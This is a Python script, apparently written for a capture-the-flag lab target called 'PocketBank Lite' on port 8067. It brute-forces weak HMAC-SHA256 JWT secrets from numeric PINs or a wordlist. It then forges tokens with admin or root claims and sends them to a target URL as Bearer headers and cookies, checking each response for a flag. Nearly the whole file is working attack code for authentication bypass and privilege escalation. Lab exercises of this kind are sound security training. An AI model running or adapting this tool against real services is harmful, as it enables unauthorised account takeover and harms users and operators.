#!/usr/bin/env python3
"""
jwt_hs256_cracker.py — Offline HS256 JWT secret brute-forcer and token forger.
Originally developed for PocketBank Lite (Port 8067).

Brute-forces weak HMAC-SHA256 secrets (numeric PINs 0000-9999 or dictionary words)
offline in sub-second time, then generates forged JWT tokens with elevated privileges
(such as role=admin or account=admin) and tests them against the target.
"""

import argparse
import base64
import hashlib
import hmac
import json
import sys
import urllib.request
import urllib.error

# Default fallback token from Port 8067
DEFAULT_TOKEN = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
    ".eyJhY2NvdW50IjoiY3VzdG9tZXIiLCJyb2xlIjoiY3VzdG9tZXIiLCJpYXQiOjE3OTQzMDM2NDF9"
    ".aEGiBoWqJC7JMSV6eM-L98d3-7m4V7ZQZNbtvTyASoA"
)


def b64url_enc(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def b64url_dec(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def b64url_json(obj: dict) -> str:
    return b64url_enc(json.dumps(obj, separators=(",", ":")).encode())


def crack_numeric(token: str, max_digits: int = 4) -> str | None:
    """Brute-forces numeric secrets from 0 to 10^max_digits - 1."""
    header, payload, sig_b64 = token.split(".")
    signing_input = f"{header}.{payload}".encode()
    target = b64url_dec(sig_b64)

    limit = 10**max_digits
    fmt = f"{{:0{max_digits}d}}"
    for i in range(limit):
        for candidate in (fmt.format(i), str(i)):
            secret = candidate.encode()
            if hmac.compare_digest(
                hmac.new(secret, signing_input, hashlib.sha256).digest(), target
            ):
                return candidate
    return None


def crack_wordlist(token: str, wordlist_path: str) -> str | None:
    """Brute-forces secrets using a dictionary wordlist."""
    header, payload, sig_b64 = token.split(".")
    signing_input = f"{header}.{payload}".encode()
    target = b64url_dec(sig_b64)

    with open(wordlist_path, encoding="latin-1", errors="replace") as f:
        for line in f:
            secret = line.strip().encode()
            if hmac.compare_digest(
                hmac.new(secret, signing_input, hashlib.sha256).digest(), target
            ):
                return secret.decode(errors="replace")
    return None


def forge_token(secret: str, claims: dict) -> str:
    """Signs new claims using the recovered HS256 secret."""
    header = b64url_json({"alg": "HS256", "typ": "JWT"})
    payload = b64url_json(claims)
    signing_input = f"{header}.{payload}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{header}.{payload}.{b64url_enc(sig)}"


def main():
    parser = argparse.ArgumentParser(
        description="Offline HS256 JWT cracker and token forger."
    )
    parser.add_argument(
        "--token", default=DEFAULT_TOKEN, help="Target JWT string to crack"
    )
    parser.add_argument(
        "--wordlist", help="Optional wordlist file (defaults to 0000-9999 numeric brute-force)"
    )
    parser.add_argument(
        "--digits", type=int, default=4, help="Max numeric digits to test (default: 4)"
    )
    parser.add_argument(
        "--target-url", help="Optional URL to probe with forged tokens (e.g. http://10.110.3.72:8067/accounts/admin)"
    )
    args = parser.parse_args()

    parts = args.token.split(".")
    if len(parts) != 3:
        sys.exit("[-] Invalid JWT format. Expected 3 dot-separated parts.")

    h_raw = json.loads(b64url_dec(parts[0]))
    p_raw = json.loads(b64url_dec(parts[1]))
    print(f"[*] Header : {h_raw}")
    print(f"[*] Payload: {p_raw}")

    if args.wordlist:
        print(f"[*] Cracking HS256 secret via wordlist: {args.wordlist} ...")
        secret = crack_wordlist(args.token, args.wordlist)
    else:
        print(f"[*] Cracking numeric HS256 secret (0–{10**args.digits - 1}) ...")
        secret = crack_numeric(args.token, args.digits)

    if not secret:
        print("[-] Secret not found. Try providing a dictionary with --wordlist <path>.")
        sys.exit(1)

    print(f"\n[+] SECRET FOUND: {secret!r}\n")

    # Generate elevated privilege token variants
    iat = p_raw.get("iat", 1794303641)
    variants = [
        ("role=admin", {"account": "customer", "role": "admin", "iat": iat}),
        ("account=admin", {"account": "admin", "role": "customer", "iat": iat}),
        ("account+role=admin", {"account": "admin", "role": "admin", "iat": iat}),
        ("account=root,role=admin", {"account": "root", "role": "admin", "iat": iat}),
        ("is_admin=true", {"account": "customer", "role": "customer", "is_admin": True, "iat": iat}),
    ]

    print("[*] Generated Forged Tokens:")
    for label, claims in variants:
        tok = forge_token(secret, claims)
        print(f"  [{label}]")
        print(f"    {tok}\n")

    if args.target_url:
        print(f"[*] Probing {args.target_url} ...")
        for label, claims in variants:
            tok = forge_token(secret, claims)
            for mode, hdrs in (
                ("bearer", {"Authorization": f"Bearer {tok}"}),
                ("cookie", {"Cookie": f"token={tok}"}),
            ):
                req = urllib.request.Request(args.target_url, headers=hdrs)
                try:
                    with urllib.request.urlopen(req, timeout=5) as resp:
                        body = resp.read().decode(errors="replace")
                        if "flag{" in body:
                            print(f"[+] FLAG FOUND ({label}, {mode}):")
                            print(body[:500])
                            return
                except Exception as e:
                    pass


if __name__ == "__main__":
    main()
